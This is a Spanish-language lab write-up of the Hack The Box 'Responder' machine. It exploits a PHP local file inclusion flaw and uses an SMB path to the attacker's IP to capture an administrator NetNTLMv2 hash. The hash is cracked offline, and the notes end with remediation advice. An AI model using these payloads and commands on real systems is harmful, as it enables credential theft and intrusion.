---
categories:
  - "[[Ciber]]"
tags:
  - vms
  - pentesting
  - starting-point
  - lfi
  - ntlm
  - windows
created: 2026-04-15
---
## 1. Información General

- **Máquina:** [[Responder]]
- **IP:** 10.129.79.169
- **SO:** Windows
- **Dificultad:** Muy fácil
- **Fecha:** 15/04/2026

## 2. Resumen Ejecutivo

Se comprometió un servidor Windows que ejecutaba un sitio PHP vulnerable a Local File Inclusion (LFI) sin sanitización de parámetros URL. Aprovechando que PHP permite cargar URLs SMB incluso con `allow_url_include` desactivado, se forzó al servidor a autenticarse contra nuestra máquina atacante mediante el protocolo SMB. Utilizando [[Responder]] como listener, se capturó el hash NetNTLMv2 del administrador, que fue crackeado offline con John the Ripper. Las credenciales obtenidas permitieron acceso remoto completo al sistema mediante Evil-WinRM.

## 3. Enumeración (Reconocimiento)

### 3.1 Escaneo de Red

**Comando utilizado:** `nmap -sV 10.129.79.169`

| **Puerto** | **Servicio** | **Versión**                                            | **Estado** |
| ---------- | ------------ | ------------------------------------------------------ | ---------- |
| 80         | HTTP         | Apache httpd 2.4.52 (Win64, OpenSSL/1.1.1m, PHP/8.1.1) | Abierto    |
| 5985       | HTTP         | Microsoft HTTPAPI httpd 2.0 (WinRM)                    | Abierto    |

La presencia del puerto 5985 es significativa: indica que WinRM está activo, lo que abre la posibilidad de acceso remoto mediante Evil-WinRM si se obtienen credenciales válidas.

### 3.2 Análisis del Servicio Web

El servidor redirige a `unika.htb`, por lo que fue necesario añadir la entrada correspondiente al archivo `/etc/hosts`:

```bash
echo "10.129.79.169    unika.htb" | sudo tee -a /etc/hosts
````

![[Pasted image 20260415162605.png]]

La enumeración de directorios con Gobuster reveló varias rutas, aunque ninguna crítica de forma directa. Lo verdaderamente relevante se encontró inspeccionando la navegación del sitio: el parámetro `?page=` en la URL carga dinámicamente distintas versiones de la página (`french.html`, `german.html`, etc.), y no aplica ningún tipo de sanitización sobre la entrada del usuario.

```bash
gobuster dir -u 10.129.79.169 --wordlist "/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt"
```

![[Pasted image 20260415162803.png]]

## 4. Análisis de Vulnerabilidades

### 4.1 Local File Inclusion (LFI)

El parámetro `?page=` utiliza el método `include()` de PHP para servir contenido sin validar la ruta proporcionada. Esto permite a un atacante referenciar rutas arbitrarias del sistema de archivos del servidor.

**Prueba de concepto:**

```
http://unika.htb/?page=../../../../windows/system32/drivers/etc/hosts
```

La respuesta confirmó que el servidor devuelve el contenido del archivo `hosts` de Windows, validando la vulnerabilidad LFI.

![[Pasted image 20260415163145.png]]

### 4.2 Captura de Hash NetNTLMv2 mediante SMB

Aunque la directiva `allow_url_include` esté desactivada en `php.ini`, PHP no impide la carga de URLs con el protocolo SMB. Esto significa que se puede referenciar una ruta UNC apuntando a nuestra máquina atacante: el servidor Windows intentará autenticarse mediante el protocolo NTLM, exponiendo el hash NetNTLMv2 del usuario que ejecuta el servicio web.

**Flujo del ataque:**

El protocolo NTLM utiliza un mecanismo de desafío-respuesta: el servidor genera un desafío aleatorio, el cliente lo cifra con el hash de su contraseña y devuelve la respuesta. Esta respuesta (el NetNTLMv2) puede capturarse y atacarse offline con herramientas de cracking.

## 5. Explotación

### 5.1 Captura del Hash con [[Responder]]

Se levantó [[Responder]] escuchando en la interfaz VPN (`tun0`) para simular un servidor SMB legítimo:

```bash
sudo [[Responder|responder]] -I tun0
```

Paralelamente, se envió la siguiente petición desde el navegador, referenciando una ruta UNC hacia nuestra IP de atacante:

```
http://unika.htb/?page=//10.10.16.225/whatever
```

El servidor intentó autenticarse contra nuestro listener SMB, y [[Responder]] capturó el hash NetNTLMv2:

```
[SMB] NTLMv2-SSP Username : [[Responder|RESPONDER]]\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::[[Responder|RESPONDER]]:4198d1d8a1688c5e:A0FA6A874359EE98A4536357517D5934:0101...
```

### 5.2 Cracking del Hash con John the Ripper

El hash capturado se almacenó en un fichero (`hash.txt`) y se atacó con el diccionario `rockyou.txt`:

```bash
john -w=/usr/share/wordlists/rockyou.txt hash.txt
```

**Resultado:** La contraseña del administrador es `badminton`, obtenida en menos de un segundo.

### 5.3 Acceso Remoto con Evil-WinRM

Con las credenciales en claro, se estableció una sesión remota interactiva mediante WinRM:

```bash
evil-winrm -i 10.129.79.169 -u administrator -p badminton
```

Desde la sesión obtenida, se localizó la flag en el escritorio del usuario `mike`:

```powershell
type ..\..\mike\Desktop\flag.txt
```

**Flag:** `ea81b7afddd03efaa0945333ed147fac`

## 6. Remediación y Conclusiones

- **Criticidad:** Alta

La cadena de ataque completa — desde la LFI hasta la toma de control del sistema — es completamente evitable aplicando las siguientes medidas.

En primer lugar, la vulnerabilidad LFI se elimina validando y saneando cualquier parámetro que controle la carga de ficheros, utilizando una lista blanca de valores permitidos en lugar de pasar la entrada del usuario directamente a `include()`. En segundo lugar, aunque PHP no bloquee URLs SMB por defecto, la carga de recursos externos mediante `include()` debería restringirse estrictamente al sistema de archivos local, y el servidor web debería ejecutarse con una cuenta de servicio de mínimos privilegios para limitar la exposición de credenciales. Por último, la contraseña del administrador (`badminton`) es trivialmente débil; la implementación de una política de contraseñas robustas y el uso de autenticación multifactor para accesos remotos habría impedido el cracking incluso si el hash hubiera sido capturado.